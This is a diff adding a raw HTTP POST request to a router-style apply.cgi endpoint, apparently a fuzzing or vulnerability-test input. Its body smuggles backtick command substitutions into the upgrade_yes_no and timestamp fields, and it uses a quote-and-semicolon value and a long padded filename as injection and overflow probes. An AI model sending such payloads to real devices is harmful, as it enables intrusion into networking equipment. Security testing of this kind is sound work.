@@ -1,0 +1,6 @@
+POST /apply.cgi?USB_disk_rm.htm?dev_name=usb_approved_add HTTP/1.1
+Host: hidden_manual_set_ant.html
+Content-Type: application/json
+Content-Length: 215
+
+ava_devname=;"wzq&upgrade_yes_no=`wzq`&submit_flag=wan&filename=aaaWZQaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaWZQwaaaaaaaa&%20timestamp=\r\n`wzq`
